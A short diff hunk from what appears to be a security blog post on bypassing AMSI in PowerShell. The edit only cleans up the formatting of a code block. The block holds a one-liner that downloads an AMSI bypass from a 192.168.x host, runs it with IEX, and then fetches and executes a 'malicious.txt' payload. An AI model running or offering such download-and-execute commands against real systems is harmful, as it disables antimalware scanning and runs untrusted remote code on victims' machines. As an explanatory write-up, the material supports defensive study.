@@ -530,11 +530,8 @@ We restart PowerShell, and now try to combine this bypass with our
 malicious script, on the same line, as done earlier:
 
 ```
-$full =3D (New-Object Net.Webclient).downloadstring("
-http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583));
-IEX($full.substring(583,60)); IEX($full.substring(643,126)); (New-Object
-Net.Webclient).downloadstring("
-http://192.168.159.131/rastamouse/malicious.txt")|IEX
+$full =(New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583));
+IEX($full.substring(583,60)); IEX($full.substring(643,126)); (New-Object Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/malicious.txt")|IEX
 ```
 ![image18.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image18.png)
 
